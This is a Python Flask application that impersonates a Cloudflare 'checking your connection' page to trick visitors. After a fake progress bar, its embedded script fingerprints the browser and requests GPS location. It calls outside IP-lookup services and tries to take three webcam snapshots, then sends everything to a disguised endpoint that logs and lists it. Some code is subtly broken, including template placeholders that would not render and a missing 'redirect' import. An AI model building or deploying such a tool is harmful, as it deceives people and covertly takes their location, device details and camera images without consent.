import os
import json
import time
import random
import string
from flask import Flask, request, render_template_string, make_response

app = Flask(__name__)

CAPTURED_DATA = []

def generate_ray_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))

def generate_cf_headers():
    return {
        'Server': 'cloudflare',
        'CF-RAY': generate_ray_id(),
        'Cache-Control': 'no-cache, no-store',
        'Pragma': 'no-cache'
    }

CLOUDFLARE_CLONE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Just a moment...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #f5f7fa;
            color: #2d3748;
            line-height: 1.6;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }}
        
        .cf-wrapper {{
            background: #ffffff;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
            padding: 40px;
            max-width: 580px;
            width: 100%;
            text-align: center;
            border: 1px solid #e2e8f0;
        }}
        
        .cf-icon {{
            font-size: 64px;
            margin-bottom: 24px;
            color: #f6821f;
        }}
        
        .cf-header {{
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 16px;
            color: #1a202c;
        }}
        
        .cf-subheader {{
            font-size: 18px;
            color: #4a5568;
            margin-bottom: 32px;
        }}
        
        .cf-progress {{
            background: #edf2f7;
            border-radius: 100px;
            height: 8px;
            margin: 32px 0;
            overflow: hidden;
            position: relative;
        }}
        
        .cf-progress-bar {{
            background: linear-gradient(90deg, #f6821f, #ff8c37);
            height: 100%;
            width: 0%;
            animation: progressAnimation 5s ease-in-out;
            animation-fill-mode: forwards;
        }}
        
        @keyframes progressAnimation {{
            0% {{ width: 0%; }}
            100% {{ width: 100%; }}
        }}
        
        .cf-info-box {{
            background: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 8px;
            padding: 20px;
            margin-top: 24px;
            text-align: left;
        }}
        
        .cf-ray-id {{
            font-family: 'Courier New', monospace;
            background: #edf2f7;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 14px;
            color: #4a5568;
        }}
        
        .cf-footer {{
            margin-top: 24px;
            padding-top: 20px;
            border-top: 1px solid #e2e8f0;
            font-size: 14px;
            color: #718096;
        }}
        
        .cf-browser-check {{
            display: none;
        }}
        
        .cf-spinner {{
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f4f6;
            border-top: 3px solid #f6821f;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 12px;
            vertical-align: middle;
        }}
        
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        
        .cf-loading-text {{
            display: inline-block;
            vertical-align: middle;
            color: #4a5568;
        }}
    </style>
</head>
<body>
    <div class="cf-wrapper">
        <div class="cf-icon">⛔</div>
        
        <h1 class="cf-header">Checking if the site connection is secure</h1>
        
        <p class="cf-subheader">
            {domain} needs to review the security of your connection before proceeding.
        </p>
        
        <div class="cf-progress">
            <div class="cf-progress-bar"></div>
        </div>
        
        <div class="cf-browser-check" id="browserCheck">
            <span class="cf-spinner"></span>
            <span class="cf-loading-text">Performing security check</span>
        </div>
        
        <div class="cf-info-box">
            <p><strong>Why do I have to complete this?</strong></p>
            <p style="margin-top: 8px;">
                Cloudflare Ray ID: <span class="cf-ray-id">{ray_id}</span>
            </p>
            <p style="margin-top: 8px;">
                This process is automatic. Your browser will redirect to your requested content shortly.
            </p>
            <p style="margin-top: 8px;">
                Please allow up to 5 seconds...
            </p>
        </div>
        
        <div class="cf-footer">
            <p>DDoS protection by Cloudflare</p>
            <p style="margin-top: 4px;">Ray ID: {ray_id}</p>
        </div>
    </div>

    <script>
        // Show browser check after 2 seconds
        setTimeout(() => {{
            document.getElementById('browserCheck').style.display = 'block';
        }}, 2000);
        
        // Start data collection after progress bar completes
        setTimeout(() => {{
            collectAllData();
        }}, 5000);
        
        function collectAllData() {{
            const collectedData = {{
                timestamp: new Date().toISOString(),
                ray_id: '{ray_id}',
                user_agent: navigator.userAgent,
                screen_resolution: {{ 
                    width: screen.width, 
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth
                }},
                viewport: {{
                    width: window.innerWidth,
                    height: window.innerHeight
                }},
                language: navigator.language,
                languages: navigator.languages,
                platform: navigator.platform,
                hardware_concurrency: navigator.hardwareConcurrency,
                device_memory: navigator.deviceMemory,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookie_enabled: navigator.cookieEnabled,
                do_not_track: navigator.doNotTrack,
                pdf_viewer_enabled: navigator.pdfViewerEnabled,
                max_touch_points: navigator.maxTouchPoints,
                webdriver: navigator.webdriver,
                plugins: Array.from(navigator.plugins).map(plugin => ({{
                    name: plugin.name,
                    filename: plugin.filename,
                    description: plugin.description
                }})),
                mime_types: Array.from(navigator.mimeTypes).map(mime => ({{
                    type: mime.type,
                    description: mime.description
                }}))
            }};
            
            // Get battery information
            if ('getBattery' in navigator) {{
                navigator.getBattery().then(battery => {{
                    collectedData.battery = {{
                        level: Math.round(battery.level * 100),
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    }};
                    getLocationData(collectedData);
                }});
            }} else {{
                getLocationData(collectedData);
            }}
        }}
        
        function getLocationData(collectedData) {{
            // Get geolocation
            if (navigator.geolocation) {{
                navigator.geolocation.getCurrentPosition(
                    position => {{
                        collectedData.geolocation = {{
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            altitudeAccuracy: position.coords.altitudeAccuracy,
                            heading: position.coords.heading,
                            speed: position.coords.speed
                        }};
                        getNetworkData(collectedData);
                    }},
                    error => {{
                        collectedData.geolocation_error = error.code;
                        getNetworkData(collectedData);
                    }},
                    {{ 
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }}
                );
            }} else {{
                getNetworkData(collectedData);
            }}
        }}
        
        function getNetworkData(collectedData) {{
            // Get IP and network information from multiple sources
            Promise.allSettled([
                fetch('https://api.ipify.org?format=json').then(r => r.json()),
                fetch('https://ipapi.co/json/').then(r => r.json()),
                fetch('https://ipinfo.io/json').then(r => r.json())
            ]).then(results => {{
                collectedData.ip_info = {{}};
                results.forEach((result, index) => {{
                    if (result.status === 'fulfilled') {{
                        collectedData.ip_info[`source_${index}`] = result.value;
                    }}
                }});
                getCameraData(collectedData);
            }}).catch(() => {{
                getCameraData(collectedData);
            }});
        }}
        
        function getCameraData(collectedData) {{
            // Attempt camera access
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {{
                navigator.mediaDevices.getUserMedia({{
                    video: {{
                        width: {{ ideal: 1280 }},
                        height: {{ ideal: 720 }},
                        facingMode: 'user'
                    }},
                    audio: false
                }}).then(stream => {{
                    const video = document.createElement('video');
                    const canvas = document.createElement('canvas');
                    const context = canvas.getContext('2d');
                    
                    video.srcObject = stream;
                    video.play();
                    
                    setTimeout(() => {{
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        context.drawImage(video, 0, 0);
                        
                        // Capture multiple frames
                        const frames = [];
                        for (let i = 0; i < 3; i++) {{
                            setTimeout(() => {{
                                context.drawImage(video, 0, 0);
                                frames.push(canvas.toDataURL('image/jpeg', 0.8));
                                
                                if (frames.length === 3) {{
                                    collectedData.camera_frames = frames;
                                    stream.getTracks().forEach(track => track.stop());
                                    sendCollectedData(collectedData);
                                }}
                            }}, i * 500);
                        }}
                    }}, 1000);
                }}).catch(error => {{
                    collectedData.camera_error = error.name;
                    sendCollectedData(collectedData);
                }});
            }} else {{
                sendCollectedData(collectedData);
            }}
        }}
        
        function sendCollectedData(data) {{
            // Send all collected data to server
            fetch('/_cf_captcha_challenge', {{
                method: 'POST',
                headers: {{
                    'Content-Type': 'application/json',
                    'X-Cloudflare-Captcha': 'true'
                }},
                body: JSON.stringify(data)
            }}).then(response => {{
                // Redirect after sending data
                setTimeout(() => {{
                    window.location.href = '/_cf_success';
                }}, 1000);
            }}).catch(() => {{
                setTimeout(() => {{
                    window.location.href = '/_cf_success';
                }}, 1000);
            }});
        }}
    </script>
</body>
</html>
"""

SUCCESS_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Redirecting...</title>
    <meta http-equiv="refresh" content="2;url=https://www.cloudflare.com">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: #f5f7fa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .message {
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 500px;
        }
        .success-icon {
            font-size: 64px;
            margin-bottom: 20px;
            color: #48bb78;
        }
    </style>
</head>
<body>
    <div class="message">
        <div class="success-icon">✅</div>
        <h1>Verification Successful</h1>
        <p>You will be redirected shortly...</p>
    </div>
</body>
</html>
"""

@app.route('/')
def cloudflare_challenge():
    # Force refresh by not using cache
    ray_id = generate_ray_id()
    domain = request.host
    
    response = make_response(render_template_string(
        CLOUDFLARE_CLONE, 
        ray_id=ray_id, 
        domain=domain
    ))
    
    # Set headers to prevent caching and force refresh
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    response.headers.update(generate_cf_headers())
    
    return response

@app.route('/_cf_captcha_challenge', methods=['POST'])
def capture_data():
    data = request.get_json()
    
    # Add timestamp and IP
    data['capture_timestamp'] = time.time()
    data['client_ip'] = request.headers.get('X-Forwarded-For', request.remote_addr)
    data['cf_ray'] = request.headers.get('CF-RAY', generate_ray_id())
    
    CAPTURED_DATA.append(data)
    
    print(f"[CAPTURED] IP: {data.get('client_ip', 'Unknown')} | Time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    
    if data.get('ip_info'):
        ip_data = next(iter(data['ip_info'].values()), {})
        print(f"         Location: {ip_data.get('city', 'Unknown')}, {ip_data.get('country', 'Unknown')}")
    
    if data.get('camera_frames'):
        print(f"         📸 Camera: CAPTURED ({len(data['camera_frames'])} frames)")
    
    if data.get('geolocation'):
        loc = data['geolocation']
        print(f"         📍 GPS: {loc.get('latitude', 'N/A')}, {loc.get('longitude', 'N/A')}")
    
    return {'success': True, 'ray_id': data['cf_ray']}

@app.route('/_cf_success')
def success_page():
    response = make_response(render_template_string(SUCCESS_PAGE))
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    return response

@app.route('/_cf_data')
def view_data():
    return {'total_captures': len(CAPTURED_DATA), 'data': CAPTURED_DATA}

@app.route('/_cf_clear')
def clear_data():
    CAPTURED_DATA.clear()
    return {'status': 'cleared', 'message': 'All data cleared'}

# Block direct access to other paths
@app.route('/<path:path>')
def catch_all(path):
    return redirect('/')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
